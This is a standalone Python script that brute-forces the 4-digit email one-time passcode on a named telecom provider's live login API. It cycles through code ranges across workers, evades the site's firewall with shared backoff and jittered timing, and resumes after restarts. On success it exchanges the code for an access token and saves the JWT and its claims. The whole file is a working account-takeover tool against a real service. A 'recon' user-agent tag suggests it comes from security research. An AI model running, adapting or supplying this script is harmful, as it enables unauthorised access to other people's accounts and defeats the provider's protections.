#!/usr/bin/env python3
"""
bf2.py — single-worker blind 4-digit EMAIL-OTP brute force with EXPLICIT range.

Usage: python3 bf2.py <email> <lo> <hi> <statedir>
  guesses <lo>..<hi-1> in order, wraps at the end (WAF-lost values get
  re-covered on the second pass). Position persisted to <statedir>/pos
  every 25 guesses, so the process is restart-safe.

Standalone: python3 stdlib only (3.8+), no pip installs.
Handles per-session live codes, cosmetic attempt counter, RESEND_LATER
pacing (5s poll), a GLOBAL WAF backoff shared by all workers on this
host (env BF_WAF_FILE, default /tmp/vfo_waf_penalty), and a per-process
breaker on >6 errors/120s.
On hit: <statedir>/bf_SUCCESS.json (guessed code + JWT + claims) is
written and the process exits.
"""
import base64, hashlib, json, os, random, re, sys, time, uuid
import urllib.error, urllib.parse, urllib.request

BASE = "https://vfo01.vodafone.om"
UA = ("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Version/4.0 Chrome/120.0 Mobile Safari/537.36 h1.recon")

_stats = {"guesses": 0, "resends": 0, "errors": 0, "started": time.time()}
_err_window = []
_breaker_until = 0
WAF_FILE = os.environ.get("BF_WAF_FILE", "/tmp/vfo_waf_penalty")


def waf_hit():
    """WAF penalty page seen -> all workers (shared IP) cool down 5 min."""
    try:
        os.makedirs(os.path.dirname(WAF_FILE), exist_ok=True)
        cur = int(open(WAF_FILE).read().strip() or 0)
    except Exception:
        cur = 0
    exp = max(cur, time.time() + 240)
    try:
        open(WAF_FILE, "w").write(str(int(exp)))
    except Exception:
        pass


def waf_wait(DIR):
    while True:
        try:
            exp = int(open(WAF_FILE).read().strip() or 0)
        except Exception:
            return
        if time.time() >= exp:
            return
        if os.path.exists(os.path.join(DIR, "bf_stop")) or \
           os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")):
            return
        _log(dict(kind="error", msg="waf global backoff ~%ds left"
                  % int(exp - time.time())), DIR)
        time.sleep(min(30, max(1, exp - time.time())))


def note_error():
    global _breaker_until
    now = time.time()
    _err_window.append(now)
    del _err_window[:max(0, len(_err_window) - 20)]
    recent = [t for t in _err_window if now - t < 120]
    if len(recent) > 6 and now < _breaker_until + 170:
        _breaker_until = now + 180
        print("[bf] BREAKER: %d errors in 120s, pausing 180s" % len(recent), flush=True)


def breaker_wait(DIR):
    global _breaker_until
    if time.time() < _breaker_until:
        _log(dict(kind="error", msg="breaker pause"), DIR)
        time.sleep(_breaker_until - time.time() + 1)


def _log(d, DIR):
    d = dict(d, ts=time.strftime("%H:%M:%S", time.gmtime()) + "Z",
             elapsed=int(time.time() - _stats["started"]))
    with open(os.path.join(DIR, "bf_log.jsonl"), "a") as f:
        f.write(json.dumps(d) + "\n")
    if d.get("kind") in ("FOUND", "error", "milestone", "expired"):
        print("[bf] " + json.dumps(d), flush=True)


def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def vfo(path, body, ctype="application/json", timeout=40):
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": ctype,
         "X-Application-ID": "MVA_ANDROID", "X-Request-ID": str(uuid.uuid4()),
         "X-Correlation-ID": str(uuid.uuid4()),
         "Zen-Application": "MVA", "Zen-OS": "android", "Zen-AppVersion": "5.2.2"}
    data = body.encode() if isinstance(body, str) else json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, data=data, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def _is_html(b):
    return b.lstrip()[:1] == "<"


def start_session():
    verifier = (b64u(uuid.uuid4().bytes) + b64u(uuid.uuid4().bytes))[:64]
    challenge = b64u(hashlib.sha256(verifier.encode()).digest())
    st, b = vfo("/auth/api/public/login/v1/start",
                {"clientId": "MVA", "responseType": "code", "scope": "openid",
                 "codeChallengeMethod": "S256", "codeChallenge": challenge,
                 "state": str(uuid.uuid4())})
    if st != 200:
        if _is_html(b):
            waf_hit()
        raise RuntimeError("login start %s: %s" % (st, b[:200]))
    try:
        j = json.loads(b)
    except Exception:
        if _is_html(b):
            waf_hit()
        raise
    return j["temporaryAccessToken"], j["nextStep"]["emailOtpMethod"]["secretPayload"], verifier


def auth(tmp, sp, email, otp, resend):
    return vfo("/auth/api/public/login/v1/authenticate",
               {"authToken": {"emailOtpToken": {"secretPayload": sp, "email": email,
                                                "otp": otp, "resend": resend}},
               "temporaryAccessToken": tmp})


def ns_of(j):
    return (j.get("nextStep") or {}).get("emailOtpMethod") or {}


def exchange(code, verifier, DIR, email, cstr):
    st, b = vfo("/auth/api/public/access-token/v1",
                urllib.parse.urlencode({"client_id": "MVA", "scope": "openid",
                                        "code_verifier": verifier, "code": code,
                                        "grant_type": "authorization_code"}),
                ctype="application/x-www-form-urlencoded")
    j = json.loads(b)
    tok = j["access_token"]
    seg = tok.split(".")[1] + "=" * (-len(tok.split(".")[1]) % 4)
    claims = json.loads(base64.urlsafe_b64decode(seg))
    out = dict(ts=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
               email=email, guessed_code=cstr, auth_code=code,
               http=st, jwt=tok, claims=claims,
               total_guesses=_stats["guesses"], total_resends=_stats["resends"],
               elapsed_s=int(time.time() - _stats["started"]))
    with open(os.path.join(DIR, "bf_SUCCESS.json"), "w") as f:
        json.dump(out, f, indent=2)
    return tok


def get_code(email, tmp, sp, DIR):
    for _ in range(80):
        if os.path.exists(os.path.join(DIR, "bf_stop")) or \
           os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")):
            return None
        waf_wait(DIR)
        st, b = auth(tmp, sp, email, None, True)
        try:
            j = json.loads(b)
            tmp = j["temporaryAccessToken"]
            ns = ns_of(j)
        except Exception:
            if _is_html(b):
                waf_hit()
            _log(dict(kind="error", msg="bad resend response http=%s raw=%s"
                      % (st, b[:200])), DIR)
            note_error()
            time.sleep(15)
            return None
        if ns.get("otpStatus") == "RESEND_LATER":
            # no long cooldown: poll every 5s until the server accepts
            time.sleep(5)
            continue
        _log(dict(kind="resend", http=st, status=ns.get("otpStatus"),
                  att=ns.get("otpAttemptsLeft"),
                  expiresIn=ns.get("otpExpiresIn")), DIR)
        _stats["resends"] += 1
        return tmp, sp if not ns.get("secretPayload") else ns["secretPayload"], \
               int(ns.get("otpExpiresIn", 900))
    _log(dict(kind="error", msg="resend retries exhausted"), DIR)
    return None


def main():
    if len(sys.argv) < 5:
        sys.exit("usage: bf2.py <email> <lo> <hi> <statedir>")
    email, lo, hi, DIR = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4]
    os.makedirs(DIR, exist_ok=True)
    for f in ("bf_SUCCESS.json", "bf_stop"):
        p = os.path.join(DIR, f)
        if os.path.exists(p):
            os.remove(p)

    span = hi - lo
    pfile = os.path.join(DIR, "pos")
    pos = 0
    if os.path.exists(pfile):
        try:
            pos = int(open(pfile).read().strip() or 0)
        except Exception:
            pos = 0

    _log(dict(kind="milestone",
              msg="START email=%s range=%d-%d pos0=%d" % (email, lo, hi, pos)), DIR)

    time.sleep(random.uniform(0, 10))  # desync startup probes across workers
    while True:
        waf_wait(DIR)
        try:
            tmp, sp, verifier = start_session()
            break
        except Exception as e:
            _log(dict(kind="error", msg="initial start: %s: %s"
                      % (type(e).__name__, str(e)[:100])), DIR)
            waf_wait(DIR)
            time.sleep(15)
        if os.path.exists(os.path.join(DIR, "bf_stop")) or \
           os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")):
            return
    code_deadline = 0
    fail = 0
    last_status = 0
    while True:
        if os.path.exists(os.path.join(DIR, "bf_stop")) or \
           os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")):
            return
        waf_wait(DIR)
        breaker_wait(DIR)
        if time.time() >= code_deadline:
            r = get_code(email, tmp, sp, DIR)
            if r is None:
                try:
                    tmp, sp, verifier = start_session()
                except Exception as e:
                    _log(dict(kind="error", msg="session restart: %s" % e), DIR)
                    time.sleep(15)
                    continue
                code_deadline = 0
                continue
            tmp, sp, exp = r
            code_deadline = time.time() + exp + 5
            fail = 0
        cstr = "%04d" % (lo + pos % span)
        pos += 1
        if pos % 25 == 0:
            try:
                open(pfile, "w").write(str(pos))
            except Exception:
                pass
        time.sleep(0.7 + (time.time() * 1000 % 400) / 1000.0)
        try:
            st, b = auth(tmp, sp, email, cstr, False)
            j = json.loads(b)
        except Exception as e:
            fail += 1
            if _is_html(b):
                waf_hit()
            _log(dict(kind="error", msg="guess exc %s: %s raw=%s"
                      % (type(e).__name__, str(e)[:100], b[:120])), DIR)
            _stats["errors"] += 1
            note_error()
            if fail > 4:
                code_deadline = 0
                try:
                    tmp, sp, verifier = start_session()
                except Exception:
                    time.sleep(15)
            else:
                time.sleep(30)
            continue
        if "redirectUri" in j:
            m = re.search(r"code=([A-Za-z0-9_\-]+)", j["redirectUri"])
            _stats["guesses"] += 1
            try:
                tok = exchange(m.group(1), verifier, DIR, email, cstr)
                _log(dict(kind="FOUND", code=cstr, jwt_prefix=tok[:40],
                          guesses=_stats["guesses"]), DIR)
            except Exception as e:
                _log(dict(kind="error", msg="exchange failed: %s raw=%s"
                          % (e, b[:300])), DIR)
            return
        tmp2 = j.get("temporaryAccessToken")
        ns = ns_of(j)
        if tmp2:
            tmp = tmp2
        if ns.get("secretPayload"):
            sp = ns["secretPayload"]
        status = ns.get("otpStatus")
        _stats["guesses"] += 1
        if status != "OTP_MISMATCH":
            _log(dict(kind="expired", code=cstr, status=status,
                      att=ns.get("otpAttemptsLeft")), DIR)
            code_deadline = 0
        elif _stats["guesses"] % 100 == 0:
            _log(dict(kind="milestone", last=cstr, guesses=_stats["guesses"]), DIR)
        if time.time() - last_status >= 60:
            last_status = time.time()
            el = int(time.time() - _stats["started"])
            print("[bf] +%dm%02ds range=%d-%d pos=%d guesses=%d resends=%d errors=%d found=False"
                  % (el // 60, el % 60, lo, hi, pos, _stats["guesses"],
                     _stats["resends"], _stats["errors"]), flush=True)


if __name__ == "__main__":
    main()
